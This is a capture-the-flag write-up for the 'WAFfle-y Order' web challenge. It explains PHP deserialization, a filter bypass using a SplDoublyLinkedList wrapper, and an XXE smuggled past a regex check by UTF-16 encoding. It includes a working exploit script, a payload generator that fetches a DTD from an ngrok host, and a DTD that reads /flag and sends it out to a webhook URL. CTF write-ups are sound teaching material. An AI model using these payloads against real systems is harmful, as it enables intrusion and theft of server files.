# WAFfle-y Order
Category: Web  
Level: Medium

## Code Analysis
Checking out the `index.php` we find the `PHPSESSID` cookie is serialized:
```php index.php
if  ( empty ( $_COOKIE [ 'PHPSESSID' ])) 
{ 
    $user  =  new  UserModel; 
    $user ->username = substr(uniqid( 'guest_' ),  0 ,  10 ); 
    setcookie( 
        'PHPSESSID' , 
        base64_encode(serialize( $user )),  
        time()+ 60 * 60 * 24 ,  
        '/' 
    ); 
} 
```

In `OrderController.php` we find the deserialization:
```php OrderController.php
$body = file_get_contents( 'php://input' );   
$cookie = base64_decode( $_COOKIE [ 'PHPSESSID' ]);   
safe_object( $cookie );   
$user = unserialize( $cookie );
```

Before the deserialization the cookie is sanitized by `safe_object` method. It checks for unsafe functions starting with `__`:
```php OrderController.php
function  safe_object ( $serialized_data ) 
{ 
    $matches  = []; 
    $num_matches  = preg_match_all( '/(^|;)O:\d+:"([^"]+)"/' ,  $serialized_data ,  $matches ); 

    for  ( $i  =  0 ;  $i  <  $num_matches ;  $i ++) { 
        $methods  = get_class_methods( $matches [ 2 ][ $i ]); 
        foreach  ( $methods  as  $method ) { 
            if  (preg_match( '/^__.*$/' ,  $method ) !=  0 ) { 
                die ( "Unsafe method: ${method}" ); 
            } 
        } 
    } 
} 
```

Having found the deserialization vulnerability, the next step is to find classes that can be exploited by the deserialization vulnerability.

There is a `XmlParserModel` class and the `__wakeup` method, which is called when the object is deserialized:
```php XmlParserModel.php
class  XmlParserModel 
{ 
    private  string  $data ; 
    private  array  $env ; 

    public  function  __construct ( $data ) 
    { 
        $this ->data =  $data ; 
    } 

    public  function  __wakeup ( ) 
    { 
        if  (preg_match_all( "/<!(?:DOCTYPE|ENTITY)(?:\s|%|&#[0-9]+;|&#x[0-9a-fA-F]+;)+[^\s]+\s+(?:SYSTEM|PUBLIC)\s+[\'\"]/im" ,  $this ->data)) 
        { 
            die ( 'Unsafe XML' ); 
        } 
        $env  = @simplexml_load_string( $this ->data,  'SimpleXMLElement' , LIBXML_NOENT); 

        if  (! $env )  
        { 
            die ( 'Malformed XML' ); 
        } 

        foreach  ( $env  as  $key  =>  $value ) 
        { 
            $_ENV [ $key ] = ( string ) $value ; 
        } 
    } 
} 
```

In sum, exist a `__wakeup` method in `XmlParserModel` and object variable `$data` with `simplexml_load_string` is used as `XML` parsing. When deserializing, the vulnerability can give `$data` variables arbitrary values that can be created by external entities `XXE`.

However, when `$data` is including external entities, it will be replaced by the regular expression `/<!(?:DOCTYPE|ENTITY)(?:\s|%|&#[0-9]+;|&#x[0-9a-fA-F]+;)+[^\s]+\s+(?:SYSTEM|PUBLIC)\s+[\'\"]/im` matches, resulting in the call `die` and return `Unsafe XML`.
For this, you can `UTF-8` encoded `XML` document converted to `UTF-16` coding

## METHODOLGY
When making the call, the server checks if the cookie is “safe” with `safe_object()`. The method finds all matches of serialized objects and gets their respective class methods. If any of the class method contains `__` at the beginning (for magic methods exploits), the program dies.

Decoded cookie, the ErrorException contains magic method __construct:
O:14:"ErrorException":1:{s:8:"username";s:10:"guest_614c";}

To bypass this restriction, I studied this writeup:
https://github.com/MegadodoPublications/exploits/blob/master/composr.md#the-moderately-cool-way-that-works

Objects that implement the Serializable interface contain two methods serialize and unserialize. 
When serializing such an object a string of the following format will be returned: 
```
C:<number of characters in the class name>:"<class name>":<length of the output of the serialize method>:{<output of the serialize method>}.
```

Creating a serialized string in this format for an object of a class that doesn’t implement Serializable will work but the deserialized object will not have any class members set. It is thus not very useful for our purposes but it does lead the way to a final working exploit.
```
C:19:“SplDoublyLinkedList”:33:{i:0;:O:10:“HelloWorld”:0:{}:i:42;}
```

Notice the `:` before `O`. This prevents the regex from matching.
Part of the payload is going to look like this. `$pay` is our serialized payload object.

### XML WAF bypass
We will serialize XmlParserModel class. It has `__wakeup` magic method, and calls `simplexml_load_string()` which we will exploit. 
With this method, we can do XXE, but have to first bypass the regex check.
The LIBXML_NOENT option allows us to use XML entities.

To bypass the regex, I use UTF-16 encoding on the XML payload. 
The `simplexml_load_string()` does whats its told to do, and the regex just don’t know what’s going on and lets the payload through.

### DTD OOB exfiltration
Free from restraints, we can finally do the XXE with OOB DTD (inspiration). The challenge is internet-enabled. I’m going to fetch the DTD from ngrok which I tunnel to my machine where I host the DTD file. The DTD reads the flag file and make a call to my internet webhook, where a GET parameter contains the flag.

## Exploit
Lets create 3 files.
In `exploit.py` we generate php serialized payload and encode using base64. URL encoding is done inplicitly in requests. Insert payload into cookie and make the API call.
```python exploit.py
#!/usr/bin/python3

import requests
import subprocess
import base64

result = subprocess.run(['php', 'php_pay.php'], stdout=subprocess.PIPE)
rs = result.stdout 
pay = base64.b64encode(rs)
pay = pay.decode()

c = {'PHPSESSID': pay}
d = {"table_num":"1","food":"WAFfles"}

r = requests.post('http://206.189.124.249:32543/api/order', json=d, cookies=c)
print(r.content.decode())
```

In `php_pay.php` we create and xml paylod that will be interpreted by simplexml_load_string(). We tell it to fetch our malicious DTD and execute it. Then we convert the xml into UTF-16BE, serialize it and paste it into our predefined serialized structure.
```php php_pay.php
<?php

class XmlParserModel {
    public string $data;

    public function __construct($data)
    {
        $this->data = $data;
    }
}

/* UTF-16 encoding
 * ngrok to malicious.dtd
 */
$xml = '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://1486-88-212-37-72.ngrok.io/malicious.dtd"> %xxe;]><env><debug>1</debug></env>';

// perform utf-16 conversion (big endian)
$xml = iconv('UTF-8', 'UTF-16BE', $xml);

$pay = serialize(new XmlParserModel($xml));

// 11 is number of chars in {} block apart from variable $pay
$l = 11 + strlen($pay);
echo 'C:19:"SplDoublyLinkedList":' . $l . ':{i:0;:' . $pay . ':i:42;}';
```

In `malicious.dtd` we tell the system to get contents of /flag and encode it using base64. We have to use base64 encoding because the file contains a newline at the end, and the xml entity doesn’t like that. We then instruct the system to make and http call to our webhook which contains the flag as a GET parameter.
```dtd malicious.dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://webhook.site/d1a3d99e-30da-4cb5-8e98-a4922d66f996/?x=%file;'>">
%eval;
%exfiltrate;
```

## FLAG
Now we just need to run `exploit.py` and get the flag in the webhook.
HTB{wh0_l3t_th3_enc0d1ngs_0ut???w00f..wo0f..w0of..WAFfl3s!!}
